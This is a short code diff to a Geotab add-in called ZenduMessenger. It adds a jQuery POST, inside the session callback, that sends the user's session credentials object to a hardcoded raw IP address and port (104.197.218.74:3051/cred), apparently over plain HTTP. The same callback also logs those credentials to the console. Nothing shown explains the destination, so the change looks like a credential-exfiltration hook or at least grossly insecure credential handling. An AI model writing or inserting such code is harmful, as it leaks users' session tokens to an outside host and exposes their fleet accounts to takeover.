@@ -47,7 +47,19 @@ geotab.addin.ZenduMessenger = (api,state) => {
       api.getSession(cred => {
 
         console.log(cred);
-        //this.focus();
+
+        $.ajax({
+          type: "POST",
+          url: '104.197.218.74:3051/cred',
+          data: cred,
+          contentType: 'application/json',
+          success: function(data) {
+            console.log(data);
+          },
+          error: function(err) {
+            console.log(err);
+          }
+        });
       })
 
     },
